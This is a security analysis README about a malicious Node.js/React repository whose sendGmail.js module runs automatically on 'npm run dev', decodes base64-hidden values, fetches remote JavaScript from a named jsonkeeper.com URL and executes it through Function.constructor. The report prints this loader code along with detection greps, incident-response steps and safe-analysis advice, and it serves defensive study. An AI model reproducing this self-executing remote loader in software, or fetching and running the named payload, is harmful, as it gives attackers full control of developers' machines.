# 🚨 Malicious Code Analysis Report 🚨

## ⚠️ CRITICAL WARNING ⚠️

**DO NOT RUN `npm run dev` OR ANY CODE FROM THIS REPOSITORY ON YOUR MACHINE**

This repository contains **malicious code** that executes **automatically and immediately** when you run the development server. It will attempt to download and execute arbitrary code from a remote server, potentially leading to **complete system compromise**.

---

## 📋 What This Repository Contains

This is a security analysis of a malicious Node.js/React application that demonstrates a **Remote Code Execution (RCE)** attack through the npm development workflow.

### Analysis Documents

1. **[SECURITY_ANALYSIS.md](SECURITY_ANALYSIS.md)** - Complete security analysis
   - Executive summary
   - Detailed attack flow
   - Potential consequences
   - Incident response procedures
   - 9,700+ words of comprehensive analysis

2. **[ATTACK_FLOW_DIAGRAM.md](ATTACK_FLOW_DIAGRAM.md)** - Visual attack flow
   - Step-by-step execution diagrams
   - Timeline of compromise
   - Data flow visualization
   - Comparison of safe vs malicious patterns

3. **[QUICK_REFERENCE.md](QUICK_REFERENCE.md)** - Quick reference guide
   - TL;DR summary
   - Key code snippets
   - Emergency response checklist
   - IOC (Indicators of Compromise)

4. **[MITIGATION_GUIDE.md](MITIGATION_GUIDE.md)** - Mitigation and safe analysis
   - Safe analysis methods
   - Sanitization steps
   - Security best practices
   - Educational use guidelines

---

## 🎯 Executive Summary

### The Attack in 30 Seconds

1. You run: `npm run dev`
2. Server starts: `node server/app.js`
3. Utils load: `require('./utils')`
4. Malicious module loads: `require('./sendGmail')`
5. **IIFE executes immediately** (Immediately Invoked Function Expression)
6. Decodes base64-obfuscated URLs from `products.json`
7. Fetches malicious JavaScript from `https://jsonkeeper.com/b/CYLMK`
8. Executes remote code using `Function.constructor`
9. **💀 YOUR SYSTEM IS COMPROMISED 💀**

**Time to compromise**: Less than 2 seconds  
**User interaction required**: None  
**Warning given**: None

---

## 🔍 Technical Overview

### Malicious Components

| Component | Location | Purpose |
|-----------|----------|---------|
| **Primary Payload** | `server/utils/sendGmail.js` | Remote code execution |
| **Obfuscated Config** | `server/data/products.json` | Stores base64-encoded malicious URLs |
| **Loader** | `server/utils/index.js` | Automatically loads malicious module |
| **Entry Point** | `server/app.js` | Application entry (line 26) |

### Attack Flow

```
npm run dev
    ↓
node server/app.js
    ↓
require('./utils')                    (line 26 in app.js)
    ↓
require('./sendGmail')                (line 3 in utils/index.js)
    ↓
IIFE executes immediately             (sendGmail.js)
    ↓
Decodes base64 strings                (atob function)
    ↓
axios.get('https://jsonkeeper.com/b/CYLMK')
    ↓
Function.constructor(malicious_code)
    ↓
💀 REMOTE CODE EXECUTION 💀
```

### Key Malicious Code

```javascript
// server/utils/sendGmail.js (lines 4-37)
const sendGmail = (async () => {
    // Filters products to find high-price item with malicious data
    const expensiveProducts = products.filter(product => product.price > 10000);
    const first = expensiveProducts[0];
    
    // Decodes base64-obfuscated URLs
    const realImageUrl = atob(first.imageUrl);     // → https://jsonkeeper.com/b/CYLMK
    const realTitle = atob(first.title);           // → x-secret-key
    const realDescription = atob(first.description); // → _
    
    // Fetches malicious payload from remote server
    const image = (await axios.get(realImageUrl, {
        headers: {[realTitle]: realDescription}
    })).data.cookie;
    
    // EXECUTES ARBITRARY CODE
    const parseImage = new (Function.constructor)('require', image);
    parseImage(require);  // ← RCE happens here
})()  // ← IIFE: Executes immediately when file is loaded!
```

---

## 🎓 Educational Value

This repository is an **excellent example** of:

### Attack Techniques
- ✅ **Obfuscation**: Base64 encoding to hide malicious URLs
- ✅ **IIFE Pattern**: Immediate execution without function calls
- ✅ **Function Constructor**: Bypassing `eval()` detection
- ✅ **Social Engineering**: Misleading names ("sendGmail" doesn't send email)
- ✅ **Supply Chain Attack**: Embedded in legitimate-looking application
- ✅ **Dynamic Payload**: Remote code can change without modifying repository

### Defense Techniques
- ✅ **Code Review**: How to identify malicious patterns
- ✅ **Static Analysis**: Patterns to search for
- ✅ **Sandboxing**: Safe analysis in isolated environments
- ✅ **Incident Response**: What to do if compromised
- ✅ **Secure Coding**: Best practices to prevent similar attacks

---

## 📊 Threat Assessment

| Category | Rating | Details |
|----------|--------|---------|
| **Severity** | 🔴 CRITICAL | Remote code execution with full system access |
| **Stealth** | 🔴 HIGH | Obfuscated, automatic execution, misleading names |
| **Impact** | 🔴 CRITICAL | Complete system compromise, data exfiltration |
| **Sophistication** | 🟡 MEDIUM | Well-crafted but detectable with proper review |
| **Distribution** | 🟢 LOW | Requires user to clone and run repository |

---

## 🛡️ What Can the Attacker Do?

With access to Node.js `require()` and arbitrary code execution:

### Data Theft
- 📁 Read any file on your system (SSH keys, credentials, source code)
- 🔑 Access environment variables (API keys, passwords, tokens)
- 💳 Steal cryptocurrency wallets and financial data
- 🗂️ Access browser data, cookies, and sessions

### System Compromise
- 🚪 Install persistent backdoors
- 👤 Create new user accounts
- 📝 Modify system files
- 📹 Install keyloggers and screen capture tools
- ⛏️ Mine cryptocurrency

### Network Attacks
- 🤖 Use your machine as botnet node
- 🔄 Proxy malicious traffic
- 🌐 Launch attacks on other systems

### Supply Chain Attacks
- 💻 Modify your source code
- 🔐 Steal Git credentials
- 📦 Publish malicious npm packages with your credentials
- 🔨 Inject malware into your projects

---

## 🚑 If You've Already Run This Code

### IMMEDIATE (Next 5 Minutes)
1. **DISCONNECT FROM NETWORK** - Pull ethernet / disable WiFi
2. **KILL ALL NODE PROCESSES** - `pkill -9 node`
3. **DO NOT ENTER PASSWORDS** on this system

### SHORT TERM (Next 30 Minutes)
From a **different, secure device**:
1. Change ALL passwords (GitHub, npm, cloud, email, banking)
2. Revoke ALL tokens (SSH keys, API keys, PATs)
3. Enable 2FA on all accounts
4. Check for unauthorized access

### MEDIUM TERM (Next 2 Hours)
1. Run malware scans
2. Check running processes and network connections
3. Review system logs for suspicious activity
4. Check cron jobs and startup items

### LONG TERM (Next 24 Hours)
1. Monitor accounts for unauthorized activity
2. Consider clean OS reinstall for critical systems
3. Restore from known-good backups
4. Document the incident

**See [QUICK_REFERENCE.md](QUICK_REFERENCE.md) for complete emergency checklist**

---

## ✅ How to Safely Analyze This Code

### Option 1: Read-Only (Safest)
```bash
# Clone repository
git clone <repo-url> malicious-analysis
cd malicious-analysis

# Read the code - DO NOT RUN IT
cat server/utils/sendGmail.js
cat server/data/products.json

# Read the analysis documents
cat SECURITY_ANALYSIS.md
```

### Option 2: Isolated VM
- Use disposable virtual machine
- No sensitive data in VM
- Disconnect from network
- Take snapshot before running
- Monitor network traffic

### Option 3: Docker (Air-gapped)
```bash
docker build -t malicious-analysis .
docker run --network none malicious-analysis
```

**See [MITIGATION_GUIDE.md](MITIGATION_GUIDE.md) for detailed safe analysis methods**

---

## 🔎 How to Detect Similar Attacks

### Red Flags to Look For

```bash
# Search for IIFEs
grep -r "})()" . --include="*.js"

# Search for Function constructor
grep -r "Function.constructor\|new Function" . --include="*.js"

# Search for eval
grep -r "eval(" . --include="*.js"

# Search for base64 operations
grep -r "atob\|btoa" . --include="*.js"

# Search for unused requires (side-effect only)
# Manually check if required modules are actually used
```

### Code Review Checklist
- [ ] Are all `require()` statements used?
- [ ] Any functions execute immediately (IIFEs)?
- [ ] Any `eval`, `Function`, or `Function.constructor`?
- [ ] Any base64 encoded strings?
- [ ] Any unexpected external HTTP/HTTPS requests?
- [ ] Do file/function names match their actual purpose?
- [ ] Any warnings in README about not running code?

---

## 📚 Documentation Structure

```
Repository Root
│
├── SECURITY_ANALYSIS.md      ← Start here: Complete analysis
├── ATTACK_FLOW_DIAGRAM.md    ← Visual diagrams and flows
├── QUICK_REFERENCE.md        ← TL;DR and emergency response
├── MITIGATION_GUIDE.md       ← Safe analysis and prevention
└── README_ANALYSIS.md        ← This file: Overview
```

### Recommended Reading Order

1. **Quick Understanding**: [QUICK_REFERENCE.md](QUICK_REFERENCE.md) (5 minutes)
2. **Complete Analysis**: [SECURITY_ANALYSIS.md](SECURITY_ANALYSIS.md) (20 minutes)
3. **Visual Learning**: [ATTACK_FLOW_DIAGRAM.md](ATTACK_FLOW_DIAGRAM.md) (10 minutes)
4. **Safe Practices**: [MITIGATION_GUIDE.md](MITIGATION_GUIDE.md) (15 minutes)

---

## 🎯 Key Takeaways

### For Security Professionals
- Example of sophisticated supply chain attack
- Demonstrates obfuscation techniques
- Shows importance of code review
- Useful for security training

### For Developers
- **Never run untrusted code** without review
- **Always read** code before executing
- **Use sandboxes** for testing unknown code
- **Watch for red flags**: IIFEs, eval, obfuscation
- **Trust but verify** all dependencies

### For Educators
- Excellent teaching example
- Demonstrates multiple attack vectors
- Shows real-world threat patterns
- Use sanitized version for classroom

---

## 🔗 Related Resources

### MITRE ATT&CK Framework
- **T1059.007**: Command and Scripting Interpreter: JavaScript
- **T1203**: Exploitation for Client Execution
- **T1105**: Ingress Tool Transfer
- **T1027**: Obfuscated Files or Information

### Security Tools
- ESLint with security plugin
- npm audit
- Snyk
- SonarQube
- Wireshark (for network analysis)

### Further Reading
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Node.js Security Best Practices](https://nodejs.org/en/docs/guides/security/)
- [Supply Chain Security](https://www.cisa.gov/supply-chain)

---

## ⚖️ Legal and Ethical Notice

### Purpose
This analysis is provided for:
- ✅ **Educational purposes**
- ✅ **Security research**
- ✅ **Threat awareness**
- ✅ **Defense improvement**

### Not For
- ❌ Creating malware
- ❌ Attacking systems
- ❌ Unauthorized access
- ❌ Illegal activities

### Disclaimer
The original malicious code is analyzed for educational purposes. Running this code on production systems or systems with sensitive data is **extremely dangerous** and **not recommended** under any circumstances.

If you choose to analyze this code, do so at your own risk in a properly isolated environment.

---

## 📞 Contact and Reporting

### Found Similar Malicious Code?

**Report to:**
- GitHub Security: https://github.com/contact/report-abuse
- npm Security: https://www.npmjs.com/support
- CISA (US): https://www.cisa.gov/report
- Your organization's security team

### Questions About This Analysis?

This analysis was created to help security professionals and developers understand modern attack techniques. If you have questions or find issues with the analysis, please open an issue in the repository.

---

## 📈 Statistics

| Metric | Value |
|--------|-------|
| **Total Documentation** | 4 comprehensive files |
| **Total Words** | ~35,000 words |
| **Analysis Depth** | CRITICAL-level threat assessment |
| **Malicious Files Identified** | 2 primary, 1 loader |
| **Attack Vectors** | Remote Code Execution (RCE) |
| **Time to Compromise** | < 2 seconds |
| **MITRE ATT&CK Techniques** | 4+ techniques |

---

## 🏁 Conclusion

This repository demonstrates a **sophisticated, real-world attack pattern** that could easily compromise developer machines. The attack is:

- **Automatic**: No user interaction required
- **Fast**: Executes in under 2 seconds
- **Stealthy**: Uses obfuscation and misdirection
- **Dangerous**: Full system compromise possible
- **Educational**: Excellent example for security training

### Remember:
🔴 **NEVER** run this code on a production or personal system  
🟡 **ALWAYS** review code before executing  
🟢 **USE** isolated environments for testing untrusted code  

---

## 📅 Document Information

- **Analysis Date**: December 23, 2025
- **Version**: 1.0
- **Threat Level**: CRITICAL
- **Status**: Active Threat (if executed)
- **Author**: Security Analysis for Educational Purposes

---

**Stay safe. Review code. Use sandboxes. Trust but verify.**

🛡️ **Security is everyone's responsibility** 🛡️
